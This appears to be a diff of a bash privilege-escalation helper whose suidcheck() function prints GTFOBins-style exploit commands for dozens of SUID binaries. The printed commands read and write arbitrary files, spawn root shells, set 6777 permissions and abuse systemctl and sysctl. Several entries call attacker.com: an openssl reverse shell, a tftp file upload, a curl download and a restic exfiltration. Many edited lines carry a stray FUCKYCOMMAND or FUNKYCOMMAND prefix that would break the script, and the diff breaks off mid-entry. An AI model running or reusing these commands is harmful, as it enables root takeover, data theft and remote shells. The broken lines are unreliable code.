@@ -32,38 +32,38 @@ suidcheck() {
                     ;;
                 "alpine")
                     echo LFILE=file_to_read
-                    echo Associated Command: "$full_binary_path" -F $LFILE
+                    echo Associated Command: "$full_binary_path" -F '$LFILE'
                     found_flag=1
                     ;;
                 "ar")
-                    echo TF=$(mktemp -u)
+                    echo 'TF=$(mktemp -u)'
                     echo LFILE=file_to_read
-                    echo "$full_binary_path" r $TF $LFILE
-                    echo cat $TF
+                    echo "$full_binary_path" r '$TF $LFILE'
+                    echo 'cat $TF'
                     found_flag=1
                     ;;
                 "arj")
-                    echo TF=$(mktemp -d)
+                    echo 'TF=$(mktemp -d)'
                     echo LFILE=file_to_write
                     echo LDIR=where_to_write
-                    echo echo DATA >$TF/$LFILE
-                    echo "$full_binary_path" a $TF/a $TF/$LFILE
-                    echo "$full_binary_path" e $TF/a $LDIR
+                    echo 'echo DATA >$TF/$LFILE'
+                    echo "$full_binary_path" 'a $TF/a $TF/$LFILE'
+                    echo "$full_binary_path" 'e $TF/a $LDIR'
                     found_flag=1
                     ;;
                 "arp")
                     echo LFILE=file_to_read
-                    echo "$full_binary_path" -v -f "$LFILE"
+                    echo "$full_binary_path" -v -f '$LFILE'
                     found_flag=1
                     ;;
                 "as")
                     echo LFILE=file_to_read
-                    echo "$full_binary_path" @$LFILE
+                    echo "$full_binary_path" '@$LFILE'
                     found_flag=1
                     ;;
                 "ascii-xfr")
                     echo LFILE=file_to_read
-                    echo "$full_binary_path" -ns "$LFILE"
+                    echo "$full_binary_path" -ns '$LFILE'
                     found_flag=1
                     ;;
                 "ash")
@@ -72,52 +72,52 @@ suidcheck() {
                     ;;
                 "aspell")
                     echo LFILE=file_to_read
-                    echo "$full_binary_path" -c "$LFILE"
+                    echo "$full_binary_path" -c '$LFILE'
                     found_flag=1
                     ;;
                 "atobm")
                     echo LFILE=file_to_read
-                    echo "$full_binary_path" $LFILE 2>&1 | awk -F "'" '{printf "%s", $2}'
+                    FUCKYCOMMAND echo "$full_binary_path" '$LFILE' 2>&1 | awk -F "'" '{printf "%s", $2}'
                     found_flag=1
                     ;;
                 "awk")
                     echo LFILE=file_to_read
-                    echo "$full_binary_path" '//' "$LFILE"
+                    echo "$full_binary_path" '//' '$LFILE'
                     found_flag=1
                     ;;
                 "base32")
                     echo LFILE=file_to_read
-                    echo "$full_binary_path" "$LFILE" | base32 --decode
+                    FUCKYCOMMAND echo "$full_binary_path" '$LFILE' | "$full_binary_path" --decode
                     found_flag=1
                     ;;
                 "base64")
                     echo LFILE=file_to_read
-                    echo ./base64 "$LFILE" | base64 --decode
+                    FUCKYCOMMAND echo "$full_binary_path" '$LFILE' | "$full_binary_path" --decode
                     found_flag=1
                     ;;
                 "basenc")
                     echo LFILE=file_to_read
-                    echo "$full_binary_path" --base64 $LFILE | "$full_binary_path" -d --base64
+                    FUCKYCOMMAND echo "$full_binary_path" --base64 $LFILE | "$full_binary_path" -d --base64
                     found_flag=1
                     ;;
                 "basez")
                     echo LFILE=file_to_read
-                    echo "$full_binary_path" "$LFILE" | "$full_binary_path" --decode
+                    FUCKYCOMMAND echo "$full_binary_path" "$LFILE" | "$full_binary_path" --decode
                     found_flag=1
                     ;;
                 "bash")
-                    echo ./bash -p
+                    echo "$full_binary_path" -p
                     found_flag=1
                     ;;
                 "bc")
                     echo LFILE=file_to_read
-                    echo "$full_binary_path" -s $LFILE
+                    echo "$full_binary_path" -s '$LFILE'
                     echo quit
                     found_flag=1
                     ;;
                 "bridge")
                     echo LFILE=file_to_read
-                    echo "$full_binary_path" -b "$LFILE"
+                    echo "$full_binary_path" -b '$LFILE'
                     found_flag=1
                     ;;
                 "busybox")
@@ -126,7 +126,7 @@ suidcheck() {
                     ;;
                 "bzip2")
                     echo LFILE=file_to_read
-                    echo "$full_binary_path" -c $LFILE | "$full_binary_path" -d
+                    FUCKYCOMMAND echo "$full_binary_path" -c '$LFILE' | "$full_binary_path" -d
                     found_flag=1
                     ;;
                 "cabal")
@@ -139,12 +139,12 @@ suidcheck() {
                     ;;
                 "cat")
                     echo LFILE=file_to_read
-                    echo "$full_binary_path" "$LFILE"
+                    echo "$full_binary_path" '$LFILE'
                     found_flag=1
                     ;;
                 "chmod")
                     echo LFILE=file_to_change
-                    echo "$full_binary_path" 6777 $LFILE
+                    echo "$full_binary_path" 6777 '$LFILE'
                     found_flag=1
                     ;;
                 "choom")
@@ -153,7 +153,7 @@ suidcheck() {
                     ;;
                 "chown")
                     echo LFILE=file_to_change
-                    echo "$full_binary_path" $(id -un):$(id -gn) $LFILE
+                    echo "$full_binary_path" $(id -un):$(id -gn) '$LFILE'
                     found_flag=1
                     ;;
                 "chroot")
@@ -163,37 +163,37 @@ suidcheck() {
                 "clamscan")
                     echo LFILE=file_to_read
                     echo TF=$(mktemp -d)
-                    echo touch $TF/empty.yara
-                    echo "$full_binary_path" --no-summary -d $TF -f $LFILE 2>&1 | sed -nE 's/^(.*): No such file or directory$/\1/p'
+                    echo touch '$TF'/empty.yara
+                    FUCKYCOMMAND echo "$full_binary_path" --no-summary -d '$TF' -f '$LFILE' 2>&1 | sed -nE 's/^(.*): No such file or directory$/\1/p'
                     found_flag=1
                     ;;
                 "cmp")
                     echo LFILE=file_to_read
-                    echo "$full_binary_path" $LFILE /dev/zero -b -l
+                    echo "$full_binary_path" '$LFILE' /dev/zero -b -l
                     found_flag=1
                     ;;
                 "column")
                     echo LFILE=file_to_read
-                    echo "$full_binary_path" $LFILE
+                    echo "$full_binary_path" '$LFILE'
                     found_flag=1
                     ;;
                 "comm")
                     echo LFILE=file_to_read
-                    echo "$full_binary_path" $LFILE /dev/null 2>/dev/null
+                    echo "$full_binary_path" '$LFILE' /dev/null '2>/dev/null'
                     found_flag=1
                     ;;
                 "cpio")
                     echo LFILE=file_to_read
-                    echo TF=$(mktemp -d)
+                    echo 'TF=$(mktemp -d)'
                     echo "echo \"\$LFILE\" | "$full_binary_path" -R \$UID -dp \$TF"
-                    echo cat "$TF/$LFILE"
-                    echo ""
+                    echo cat '$TF/$LFILE'
+                    echo 
                     echo OR
-                    echo ""
-                    echo Copies $LFILE to the $LDIR directory.
+                    echo 
+                    echo Copies '$LFILE' to the '$LDIR' directory.
                     echo LFILE=file_to_write
                     echo LDIR=where_to_write
-                    echo echo DATA >$LFILE
+                    echo echo 'DATA >$LFILE'
                     echo "echo \"\$LFILE\" | ./cpio -R 0:0 -p \$LDIR"
                     found_flag=1
                     ;;
@@ -213,24 +213,24 @@ suidcheck() {
                     ;;
                 "csvtool")
                     echo LFILE=file_to_read
-                    echo "$full_binary_path" trim t $LFILE
+                    echo "$full_binary_path" trim t '$LFILE'
                     found_flag=1
                     ;;
                 "cupsfilter")
                     echo LFILE=file_to_read
-                    echo "$full_binary_path" -i application/octet-stream -m application/octet-stream $LFILE
+                    echo "$full_binary_path" -i application/octet-stream -m application/octet-stream '$LFILE'
                     found_flag=1
                     ;;
                 "curl")
                     echo Fetch a remote file via HTTP GET request.
                     echo URL=http://attacker.com/file_to_get
                     echo LFILE=file_to_save
-                    echo "$full_binary_path" $URL -o $LFILE
+                    echo "$full_binary_path" '$URL -o $LFILE'
                     found_flag=1
                     ;;
                 "cut")
                     echo LFILE=file_to_read
-                    echo "$full_binary_path" -d "" -f1 "$LFILE"
+                    echo "$full_binary_path" -d \"\" -f1 '$LFILE'
                     found_flag=1
                     ;;
                 "dash")
@@ -244,27 +244,27 @@ suidcheck() {
                     ;;
                 "dd")
                     echo LFILE=file_to_write
-                    echo echo "data" | "$full_binary_path" of=$LFILE
+                    FUCKYCOMMAND echo echo "data" | "$full_binary_path" of=$LFILE
                     found_flag=1
                     ;;
                 "debugfs")
                     echo "$full_binary_path"
-                    echo !/bin/sh
+                    echo '!/bin/sh'
                     found_flag=1
                     ;;
                 "dialog")
                     echo LFILE=file_to_read
-                    echo "$full_binary_path" --textbox "$LFILE" 0 0
+                    echo "$full_binary_path" --textbox '$LFILE' 0 0
                     found_flag=1
                     ;;
                 "diff")
                     echo LFILE=file_to_read
-                    echo "$full_binary_path" --line-format=%L /dev/null $LFILE
+                    echo "$full_binary_path" --line-format=%L /dev/null '$LFILE'
                     found_flag=1
                     ;;
                 "dig")
                     echo LFILE=file_to_read
-                    echo "$full_binary_path" -f $LFILE
+                    echo "$full_binary_path" -f '$LFILE'
                     found_flag=1
                     ;;
                 "distcc")
@@ -272,7 +272,7 @@ suidcheck() {
                     found_flag=1
                     ;;
                 "dmsetup")
-                    echo "$full_binary_path" create base <<EOF
+                    echo "$full_binary_path" 'create base <<EOF'
                     echo 0 3534848 linear /dev/loop0 94208
                     echo EOF
                     echo "$full_binary_path" ls --exec '/bin/sh -p -s'
@@ -284,8 +284,8 @@ suidcheck() {
                     ;;
                 "dosbox")
                     echo Note that the name of the written file in the following example will be FILE_TO_. Also note that echo terminates the string with a DOS-style line terminator (\r\n), if that’s a problem and your scenario allows it, you can create the file outside dosbox, then use copy to do the actual write.
-                    echo LFILE='\path\to\file_to_write'
-                    echo "$full_binary_path" -c 'mount c /' -c "echo DATA >c:$LFILE" -c exit
+                    echo LFILE='\path\\to\\file_to_write'
+                    echo "$full_binary_path" -c \'mount c /\' -c "echo DATA >c:$LFILE" -c exit
                     found_flag=1
                     ;;
                 "ed")
@@ -296,7 +296,7 @@ suidcheck() {
                     ;;
                 "efax")
                     echo LFILE=file_to_read
-                    echo "$full_binary_path" -d "$LFILE"
+                    echo "$full_binary_path" -d '$LFILE'
                     found_flag=1
                     ;;
                 "elvish")
@@ -313,17 +313,17 @@ suidcheck() {
                     ;;
                 "eqn")
                     echo LFILE=file_to_read
-                    echo "$full_binary_path" "$LFILE"
+                    echo "$full_binary_path" '$LFILE'
                     found_flag=1
                     ;;
                 "espeak")
                     echo LFILE=file_to_read
-                    echo "$full_binary_path" -qXf "$LFILE"
+                    echo "$full_binary_path" -qXf '$LFILE'
                     found_flag=1
                     ;;
                 "expand")
                     echo LFILE=file_to_read
-                    echo "$full_binary_path" "$LFILE"
+                    echo "$full_binary_path" '$LFILE'
                     found_flag=1
                     ;;
                 "expect")
@@ -332,7 +332,7 @@ suidcheck() {
                     ;;
                 "file")
                     echo LFILE=file_to_read
-                    echo "$full_binary_path" -f $LFILE
+                    echo "$full_binary_path" -f '$LFILE'
                     found_flag=1
                     ;;
                 "find")
@@ -349,17 +349,17 @@ suidcheck() {
                     ;;
                 "fmt")
                     echo LFILE=file_to_read
-                    echo "$full_binary_path" -999 "$LFILE"
+                    echo "$full_binary_path" -999 '$LFILE'
                     found_flag=1
                     ;;
                 "fold")
                     echo LFILE=file_to_read
-                    echo "$full_binary_path" -w99999999 "$LFILE"
+                    echo "$full_binary_path" -w99999999 '$LFILE'
                     found_flag=1
                     ;;
                 "gawk")
                     echo LFILE=file_to_read
-                    echo "$full_binary_path" '//' "$LFILE"
+                    echo "$full_binary_path" '//' '$LFILE'
                     echo 
                     echo OR
                     echo 
@@ -368,7 +368,7 @@ suidcheck() {
                     found_flag=1
                     ;;
                 "gcore")
-                    echo "$full_binary_path" $PID
+                    echo "$full_binary_path" '$PID'
                     found_flag=1
                     ;;
                 "gdb")
@@ -381,7 +381,7 @@ suidcheck() {
                     ;;
                 "genisoimage")
                     echo LFILE=file_to_read
-                    echo "$full_binary_path" -sort "$LFILE"    
+                    echo "$full_binary_path" -sort '$LFILE'
                     found_flag=1
                     ;;
                 "gimp")
@@ -390,40 +390,40 @@ suidcheck() {
                     ;;
                 "grep")
                     echo LFILE=file_to_read
-                    echo "$full_binary_path" '' $LFILE
+                    echo "$full_binary_path" '' '$LFILE'
                     found_flag=1
                     ;;
                 "gtester")
                     echo TF=$(mktemp)
-                    echo echo '#!/bin/sh -p' > $TF
-                    echo echo 'exec /bin/sh -p 0<&1' >> $TF
-                    echo chmod +x $TF
-                    echo sudo "$full_binary_path" -q $TF
+                    echo echo '#!/bin/sh -p' '> $TF'
+                    echo echo 'exec /bin/sh -p 0<&1' '>> $TF'
+                    echo chmod +x '$TF'
+                    echo sudo "$full_binary_path" '-q $TF'
                     found_flag=1
                     ;;
                 "gzip")
                     echo LFILE=file_to_read
-                    echo "$full_binary_path" -f $LFILE -t
+                    echo "$full_binary_path" -f '$LFILE' -t
                     found_flag=1
                     ;;
                 "hd")
                     echo LFILE=file_to_read
-                    echo "$full_binary_path" "$LFILE"
+                    echo "$full_binary_path" '$LFILE'
                     found_flag=1
                     ;;
                 "head")
                     echo LFILE=file_to_read
-                    echo "$full_binary_path" -c1G "$LFILE"
+                    echo "$full_binary_path" -c1G '$LFILE'
                     found_flag=1
                     ;;
                 "hexdump")
                     echo LFILE=file_to_read
-                    echo "$full_binary_path" -C "$LFILE"
+                    echo "$full_binary_path" -C '$LFILE'
                     found_flag=1
                     ;;
                 "highlight")
                     echo LFILE=file_to_read
-                    echo "$full_binary_path" --no-doc --failsafe "$LFILE"
+                    echo "$full_binary_path" --no-doc --failsafe '$LFILE'
                     found_flag=1
                     ;;
                 "hping3")
@@ -433,13 +433,13 @@ suidcheck() {
                     ;;
                 "iconv")
                     echo LFILE=file_to_read
-                    echo "$full_binary_path" -f 8859_1 -t 8859_1 "$LFILE"
+                    echo "$full_binary_path" -f 8859_1 -t 8859_1 '$LFILE'
                     found_flag=1
                     ;;
                 "install")
                     echo LFILE=file_to_change
-                    echo TF=$(mktemp)
-                    echo "$full_binary_path" -m 6777 $LFILE $TF
+                    echo 'TF=$(mktemp)'
+                    echo "$full_binary_path" -m 6777 '$LFILE $TF'
                     found_flag=1
                     ;;
                 "ionice")
@@ -448,7 +448,7 @@ suidcheck() {
                     ;;
                 "ip")
                     echo LFILE=file_to_read
-                    echo "$full_binary_path" -force -batch "$LFILE"
+                    echo "$full_binary_path" -force -batch '$LFILE'
                     echo 
                     echo "$full_binary_path" netns add foo
                     echo "$full_binary_path" netns exec foo /bin/sh -p
@@ -461,21 +461,21 @@ suidcheck() {
                     found_flag=1
                     ;;
                 "jjs")
-                    echo echo "Java.type('java.lang.Runtime').getRuntime().exec('/bin/sh -pc \$@|sh\${IFS}-p _ echo sh -p <$(tty) >$(tty) 2>$(tty)').waitFor()" | "$full_binary_path"
+                    FUCKYCOMMAND echo echo "Java.type('java.lang.Runtime').getRuntime().exec('/bin/sh -pc \$@|sh\${IFS}-p _ echo sh -p <$(tty) >$(tty) 2>$(tty)').waitFor()" | "$full_binary_path"
                     found_flag=1
                     ;;
                 "join")
                     echo LFILE=file_to_read
-                    echo "$full_binary_path" -a 2 /dev/null $LFILE
+                    echo "$full_binary_path" -a 2 '/dev/null $LFILE'
                     found_flag=1
                     ;;
                 "jq")
                     echo LFILE=file_to_read
-                    echo "$full_binary_path" -Rr . "$LFILE"
+                    echo "$full_binary_path" -Rr . '$LFILE'
                     found_flag=1
                     ;;
                 "jrunscript")
-                    echo "$full_binary_path" -e "exec('/bin/sh -pc \$@|sh\${IFS}-p _ echo sh -p <$(tty) >$(tty) 2>$(tty)')"
+                    FUCKYCOMMAND echo "$full_binary_path" -e "exec('/bin/sh -pc \$@|sh\${IFS}-p _ echo sh -p <$(tty) >$(tty) 2>$(tty)')"
                     found_flag=1
                     ;;
                 "julia")
@@ -488,7 +488,7 @@ suidcheck() {
                     ;;
                 "ksshell")
                     echo LFILE=file_to_read
-                    echo "$full_binary_path" -i $LFILE
+                    echo "$full_binary_path" -i '$LFILE'
                     found_flag=1
                     ;;
                 "kubectl")
@@ -510,7 +510,7 @@ suidcheck() {
                     ;;
                 "look")
                     echo LFILE=file_to_read
-                    echo "$full_binary_path" '' "$LFILE"
+                    echo "$full_binary_path" '' '$LFILE'
                     found_flag=1
                     ;;
                 "lua")
@@ -519,12 +519,12 @@ suidcheck() {
                     ;;
                 "make")
                     echo COMMAND='/bin/sh -p'
-                    echo "$full_binary_path" -s --eval=$'x:\n\t-'"$COMMAND"
+                    echo "$full_binary_path" -s --eval=$'x:\n\t-''$COMMAND'
                     found_flag=1
                     ;;
                 "mawk")
                     echo LFILE=file_to_read
-                    echo "$full_binary_path" '//' "$LFILE"
+                    echo "$full_binary_path" '//' '$LFILE'
                     found_flag=1
                     ;;
                 "more")
@@ -533,36 +533,36 @@ suidcheck() {
                     ;;
                 "mosquitto")
                     echo LFILE=file_to_read
-                    echo "$full_binary_path" -c "$LFILE"
+                    echo "$full_binary_path" -c '$LFILE'
                     found_flag=1
                     ;;
                 "msgattrib")
                     echo LFILE=file_to_read
-                    echo "$full_binary_path" -P $LFILE
+                    echo "$full_binary_path" -P '$LFILE'
                     found_flag=1
                     ;;
                 "msgcat")
                     echo LFILE=file_to_read
-                    echo "$full_binary_path" -P $LFILE
+                    echo "$full_binary_path" -P '$LFILE'
                     found_flag=1
                     ;;
                 "msgconv")
                     echo LFILE=file_to_read
-                    echo "$full_binary_path" -P $LFILE
+                    echo "$full_binary_path" -P '$LFILE'
                     found_flag=1
                     ;;
                 "msgfilter")
-                    echo echo x | "$full_binary_path" -P /bin/sh -p -c '/bin/sh -p 0<&2 1>&2; kill $PPID'
+                    FUCKYCOMMAND echo echo x | "$full_binary_path" -P /bin/sh -p -c '/bin/sh -p 0<&2 1>&2; kill $PPID'
                     found_flag=1
                     ;;
                 "msgmerge")
                     echo LFILE=file_to_read
-                    echo "$full_binary_path" -P $LFILE /dev/null
+                    echo "$full_binary_path" -P '$LFILE' /dev/null
                     found_flag=1
                     ;;
                 "msguniq")
                     echo LFILE=file_to_read
-                    echo "$full_binary_path" -P $LFILE
+                    echo "$full_binary_path" -P '$LFILE'
                     found_flag=1
                     ;;
                 "multitime")
@@ -571,9 +571,9 @@ suidcheck() {
                     ;;
                 "mv")
                     echo LFILE=file_to_write
-                    echo TF=$(mktemp)
-                    echo echo "DATA" > $TF
-                    echo "$full_binary_path" $TF $LFILE
+                    echo 'TF=$(mktemp)'
+                    echo echo "DATA" '> $TF'
+                    echo "$full_binary_path" '$TF $LFILE'
                     found_flag=1
                     ;;
                 "nasm")
@@ -588,12 +588,12 @@ suidcheck() {
                     ;;
                 "ncftp")
                     echo "$full_binary_path"
-                    echo !/bin/sh -p
+                    echo '!/bin/sh -p'
                     found_flag=1
                     ;;
                 "nft")
                     echo LFILE=file_to_read
-                    echo "$full_binary_path" -f "$LFILE"
+                    echo "$full_binary_path" -f '$LFILE'
                     found_flag=1
                     ;;
                 "nice")
@@ -602,18 +602,18 @@ suidcheck() {
                     ;;
                 "nl")
                     echo LFILE=file_to_read
-                    echo "$full_binary_path" -bn -w1 -s '' $LFILE
+                    echo "$full_binary_path" -bn -w1 -s '' '$LFILE'
                     found_flag=1
                     ;;
                 "nm")
                     echo LFILE=file_to_read
-                    echo "$full_binary_path" @$LFILE
+                    echo "$full_binary_path" '@$LFILE'
                     found_flag=1
                     ;;
                 "nmap")
                     echo The payload appears inside the regular nmap output.
                     echo LFILE=file_to_write
-                    echo "$full_binary_path" -oG=$LFILE DATA
+                    echo "$full_binary_path" '-oG=$LFILE DATA'
                     found_flag=1
                     ;;
                 "node")
@@ -626,7 +626,7 @@ suidcheck() {
                     ;;
                 "od")
                     echo LFILE=file_to_read
-                    echo "$full_binary_path" -An -c -w9999 "$LFILE"
+                    echo "$full_binary_path" -An -c -w9999 '$LFILE'
                     found_flag=1
                     ;;
                 "openssl")
@@ -638,27 +638,27 @@ suidcheck() {
                     echo 
                     echo RHOST=attacker.com
                     echo RPORT=12345
-                    echo mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | "$full_binary_path" s_client -quiet -connect $RHOST:$RPORT > /tmp/s; rm /tmp/s
+                    FUCKYCOMMAND echo mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | "$full_binary_path" s_client -quiet -connect $RHOST:$RPORT > /tmp/s; rm /tmp/s
                     echo 
                     echo LFILE=file_to_write
-                    echo echo DATA | "$full_binary_path" enc -out "$LFILE"
+                    FUCKYCOMMAND echo echo DATA | "$full_binary_path" enc -out "$LFILE"
                     found_flag=1
                     ;;
                 "openvpn")
                     echo "$full_binary_path" --dev null --script-security 2 --up '/bin/sh -p -c "sh -p"'
                     echo The file is actually parsed and the first partial wrong line is returned in an error message.
                     echo LFILE=file_to_read
-                    echo "$full_binary_path" --config "$LFILE"
+                    echo "$full_binary_path" --config '$LFILE'
                     found_flag=1
                     ;;
                 "pandoc")
                     echo LFILE=file_to_write
-                    echo echo DATA | "$full_binary_path" -t plain -o "$LFILE"
+                    FUCKYCOMMAND echo echo DATA | "$full_binary_path" -t plain -o '$LFILE'
                     found_flag=1
                     ;;
                 "paste")
                     echo LFILE=file_to_read
-                    echo "$full_binary_path" $LFILE
+                    echo "$full_binary_path" '$LFILE'
                     found_flag=1
                     ;;
                 "perf")
@@ -684,17 +684,17 @@ suidcheck() {
                     ;;
                 "pidstat")
                     echo COMMAND=id
-                    echo "$full_binary_path" -e $COMMAND
+                    echo "$full_binary_path" -e '$COMMAND'
                     found_flag=1
                     ;;
                 "pr")
                     echo LFILE=file_to_read
-                    echo "$full_binary_path" -T $LFILE
+                    echo "$full_binary_path" -T '$LFILE'
                     found_flag=1
                     ;;
                 "ptx")
                     echo LFILE=file_to_read
-                    echo "$full_binary_path" -w 5000 "$LFILE"
+                    echo "$full_binary_path" -w 5000 '$LFILE'
                     found_flag=1
                     ;;
                 "python")
@@ -707,7 +707,7 @@ suidcheck() {
                     ;;
                 "readelf")
                     echo LFILE=file_to_read
-                    echo "$full_binary_path" -a @$LFILE
+                    echo "$full_binary_path" -a '@$LFILE'
                     found_flag=1
                     ;;
                 "restic")
@@ -715,12 +715,12 @@ suidcheck() {
                     echo RPORT=12345
                     echo LFILE=file_or_dir_to_get
                     echo NAME=backup_name
-                    echo "$full_binary_path" backup -r "rest:http://$RHOST:$RPORT/$NAME" "$LFILE"
+                    echo "$full_binary_path" backup -r 'rest:http://$RHOST:$RPORT/$NAME' '$LFILE'
                     found_flag=1
                     ;;
                 "rev")
                     echo LFILE=file_to_read
-                    echo "$full_binary_path" $LFILE | rev
+                    FUCKYCOMMAND echo "$full_binary_path" $LFILE | rev
                     found_flag=1
                     ;;
                 "rlwrap")
@@ -732,7 +732,7 @@ suidcheck() {
                     found_flag=1
                     ;;
                 "rtorrent")
-                    echo echo "execute = /bin/sh,-p,-c,\"/bin/sh -p <$(tty) >$(tty) 2>$(tty)\"" >~/.rtorrent.rc
+                    FUCKYCOMMAND echo echo "execute = /bin/sh,-p,-c,\"/bin/sh -p <$(tty) >$(tty) 2>$(tty)\"" >~/.rtorrent.rc
                     echo "$full_binary_path"
                     found_flag=1
                     ;;
@@ -759,17 +759,17 @@ suidcheck() {
                     ;;
                 "sed")
                     echo LFILE=file_to_read
-                    echo "$full_binary_path" -e '' "$LFILE"
+                    echo "$full_binary_path" -e \'\' '$LFILE'
                     found_flag=1
                     ;;
                 "setarch")
-                    echo "$full_binary_path" $(arch) /bin/sh -p
+                    echo "$full_binary_path" '$(arch)' /bin/sh -p
                     found_flag=1
                     ;;
                 "setfacl")
                     echo LFILE=file_to_change
                     echo USER=somebody
-                    echo "$full_binary_path" -m u:$USER:rwx $LFILE
+                    echo "$full_binary_path" '-m u:$USER:rwx $LFILE'
                     found_flag=1
                     ;;
                 "setlock")
@@ -778,12 +778,12 @@ suidcheck() {
                     ;;
                 "shuf")
                     echo LFILE=file_to_write
-                    echo "$full_binary_path" -e DATA -o "$LFILE"
+                    echo "$full_binary_path" -e DATA -o '$LFILE'
                     found_flag=1
                     ;;
                 "soelim")
                     echo LFILE=file_to_read
-                    echo "$full_binary_path" "$LFILE"
+                    echo "$full_binary_path" '$LFILE'
                     found_flag=1
                     ;;
                 "softlimit")
@@ -792,21 +792,21 @@ suidcheck() {
                     ;;
                 "sort")
                     echo LFILE=file_to_read
-                    echo "$full_binary_path" -m "$LFILE"
+                    echo "$full_binary_path" -m '$LFILE'
                     found_flag=1
                     ;;
                 "sqlite3")
                     echo LFILE=file_to_read
-                    echo "$full_binary_path" << EOF
-                    echo CREATE TABLE t(line TEXT);
-                    echo .import $LFILE t
+                    echo "$full_binary_path" '<< EOF'
+                    echo 'CREATE TABLE t(line TEXT);'
+                    echo '.import '$LFILE' t'
                     echo SELECT * FROM t;
                     echo EOF
                     found_flag=1
                     ;;
                 "ss")
                     echo LFILE=file_to_read
-                    echo "$full_binary_path" -a -F $LFILE
+                    echo "$full_binary_path" -a -F '$LFILE'
                     found_flag=1
                     ;;
                 "ssh-agent")
@@ -819,7 +819,7 @@ suidcheck() {
                     ;;
                 "ssh-keyscan")
                     echo LFILE=file_to_read
-                    echo "$full_binary_path" -f $LFILE
+                    echo "$full_binary_path" -f '$LFILE'
                     found_flag=1
                     ;;
                 "sshpass")
@@ -827,7 +827,7 @@ suidcheck() {
                     found_flag=1
                     ;;
                 "start-stop-daemon")
-                    echo "$full_binary_path" -n $RANDOM -S -x /bin/sh -- -p
+                    echo "$full_binary_path" -n '$RANDOM' -S -x /bin/sh -- -p
                     found_flag=1
                     ;;
                 "stdbuf")
@@ -840,36 +840,36 @@ suidcheck() {
                     ;;
                 "strings")
                     echo LFILE=file_to_read
-                    echo "$full_binary_path" "$LFILE"
+                    echo "$full_binary_path" '$LFILE'
                     found_flag=1
                     ;;
                 "sysctl")
                     echo COMMAND='/bin/sh -c id>/tmp/id'
-                    echo "$full_binary_path" "kernel.core_pattern=|$COMMAND"
-                    echo sleep 9999 &
+                    echo "$full_binary_path" 'kernel.core_pattern=|$COMMAND'
+                    echo 'sleep 9999 &'
                     echo kill -QUIT $!
                     echo cat /tmp/id
                     found_flag=1
                     ;;
                 "systemctl")
-                    echo TF=$(mktemp).service
-                    echo echo '[Service]
+                    echo 'TF=$(mktemp).service'
+                    echo echo \'[Service]
                     echo Type=oneshot
-                    echo ExecStart=/bin/sh -c "id > /tmp/output"
+                    echo 'ExecStart=/bin/sh -c id > /tmp/output'
                     echo [Install]
-                    echo WantedBy=multi-user.target' > $TF
-                    echo "$full_binary_path" link $TF
-                    echo "$full_binary_path" enable --now $TF
+                    echo 'WantedBy=multi-user.target > $TF'
+                    echo "$full_binary_path" link '$TF'
+                    echo "$full_binary_path" enable --now '$TF'
                     found_flag=1
                     ;;
                 "tac")
                     echo LFILE=file_to_read
-                    echo "$full_binary_path" -s 'RANDOM' "$LFILE"
+                    echo "$full_binary_path" -s 'RANDOM' '$LFILE'
                     found_flag=1
                     ;;
                 "tail")
                     echo LFILE=file_to_read
-                    echo "$full_binary_path" -c1G "$LFILE"
+                    echo "$full_binary_path" -c1G '$LFILE'
                     found_flag=1
                     ;;
                 "taskset")
@@ -878,33 +878,33 @@ suidcheck() {
                     ;;
                 "tbl")
                     echo LFILE=file_to_read
-                    echo "$full_binary_path" $LFILE
+                    echo "$full_binary_path" '$LFILE'
                     found_flag=1
                     ;;
                 "tclsh")
                     echo "$full_binary_path"
-                    echo exec /bin/sh -p <@stdin >@stdout 2>@stderr
+                    echo 'exec /bin/sh -p <@stdin >@stdout 2>@stderr'
                     found_flag=1
                     ;;
                 "tee")
                     echo LFILE=file_to_write
-                    echo echo DATA | "$full_binary_path" -a "$LFILE"
+                    FUCKYCOMMAND echo echo DATA | "$full_binary_path" -a "$LFILE"
                     found_flag=1
                     ;;
                 "terraform")
                     echo "$full_binary_path" console
-                    echo file("file_to_read")
+                    echo 'file("file_to_read")'
                     found_flag=1
                     ;;
                 "tftp")
                     echo RHOST=attacker.com
-                    echo "$full_binary_path" $RHOST
+                    echo "$full_binary_path" '$RHOST'
                     echo put file_to_send
                     found_flag=1
                     ;;
                 "tic")
                     echo LFILE=file_to_read
-                    echo "$full_binary_path" -C "$LFILE"
+                    echo "$full_binary_path" -C '$LFILE'
                     found_flag=1
                     ;;
                 "time")
@@ -917,17 +917,17 @@ suidcheck() {
                     ;;
                 "troff")
                     echo LFILE=file_to_read
-                    echo "$full_binary_path" $LFILE
+                    echo "$full_binary_path" '$LFILE'
                     found_flag=1
                     ;;
                 "ul")
                     echo LFILE=file_to_read
-                    echo "$full_binary_path" "$LFILE"
+                    echo "$full_binary_path" '$LFILE'
                     found_flag=1
                     ;;
                 "unexpand")
                     echo LFILE=file_to_read
-                    echo "$full_binary_path" -t99999999 "$LFILE"
+                    echo "$full_binary_path" -t99999999 '$LFILE'
                     found_flag=1
                     ;;
                 "unsquashfs")
@@ -941,7 +941,7 @@ suidcheck() {
                     ;;
                 "uniq")
                     echo LFILE=file_to_read
-                    echo "$full_binary_path" "$LFILE"
+                    echo "$full_binary_path" '$LFILE'
                     found_flag=1
                     ;;
                 "unzip")
@@ -951,23 +951,23 @@ suidcheck() {
                     ;;
                 "update-alternatives")
                     echo LFILE=/path/to/file_to_write
-                    echo TF=$(mktemp)
-                    echo echo DATA >$TF
-                    echo "$full_binary_path" --force --install "$LFILE" x "$TF" 0
+                    echo 'TF=$(mktemp)'
+                    echo echo 'DATA >$TF'
+                    echo "$full_binary_path" '--force --install "$LFILE" x "$TF" 0'
                     found_flag=1
                     ;;
                 "uudecode")
                     echo LFILE=file_to_read
-                    echo uuencode "$LFILE" /dev/stdout | "$full_binary_path"
+                    FUNKYCOMMAND echo uuencode "$LFILE" /dev/stdout | "$full_binary_path"
                     found_flag=1
                     ;;
                 "uuencode")
                     echo LFILE=file_to_read
-                    echo "$full_binary_path" "$LFILE" /dev/stdout | uudecode
+                    FUNKYCOMMAND echo "$full_binary_path" "$LFILE" /dev/stdout | uudecode
                     found_flag=1
                     ;;
                 "vagrant")
-                    echo cd $(mktemp -d)
+                    echo 'cd $(mktemp -d)'
                     echo echo 'exec "/bin/sh -p"' > Vagrantfile
                     echo "$full_binary_path" up
                     found_flag=1
@@ -1009,13 +1009,13 @@ suidcheck() {
                 "wget")
                     echo TF=$(mktemp)
                     echo chmod +x $TF
-                    echo echo -e '#!/bin/sh -p\n/bin/sh -p 1>&0' >$TF
